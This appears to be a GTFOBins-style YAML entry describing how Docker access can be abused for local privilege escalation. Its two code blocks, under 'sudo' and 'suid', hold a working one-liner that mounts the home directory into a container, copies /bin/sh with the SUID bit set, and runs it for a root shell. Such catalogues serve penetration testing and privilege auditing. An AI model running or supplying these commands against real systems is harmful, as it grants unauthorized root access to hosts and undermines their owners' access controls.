---
description: |
  Exploit the fact that Docker runs as root to create a SUID binary on the host using a container. This requires the user to be privileged enough to run docker, e.g. being in the `docker` group. Any other Docker Linux image should work, e.g., `debian`.
functions:
  sudo:
    - code: |
        sudo docker run --rm -v /home/$USER:/h_docs ubuntu \
            sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh' && ~/sh -p
  suid:
    - code: |
        ./docker run --rm -v /home/$USER:/h_docs ubuntu \
            sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh' && ~/sh -p
---
